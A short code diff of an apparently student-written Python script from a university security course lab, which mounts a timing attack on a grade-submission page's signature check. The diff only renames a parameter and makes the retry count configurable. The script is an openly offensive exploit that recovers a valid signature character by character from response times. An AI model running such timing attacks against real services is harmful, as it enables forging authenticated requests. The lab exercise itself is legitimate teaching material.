@@ -2,8 +2,8 @@ import requests
 
 requests.packages.urllib3.disable_warnings()
 
-def sort(chars, size=4):
-  top = sorted(chars, key=lambda x: -x[1])[:size]
+def sort(chars, cut=4):
+  top = sorted(chars, key=lambda x: -x[1])[:cut]
   return [ x for x, y in top ]
 
 def most_common(L):
@@ -11,7 +11,7 @@ def most_common(L):
 
 # An timing attack based on bad chrcmp function
 # that even works on Wi-Fi eduroam
-def timing_attack(name, grade, size=20):
+def timing_attack(name, grade, size=20, tries=20):
   url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
   params = {'name': name, 'grade': grade, 'signature': ''}
   hex_string = '0123456789abcdef'
@@ -22,7 +22,7 @@ def timing_attack(name, grade, size=20):
   for i in range(size):
     sig_chars = []
 
-    for RETRY in range(20):
+    for RETRY in range(tries):
       chars = []
 
       for j in range(len(hex_string)):
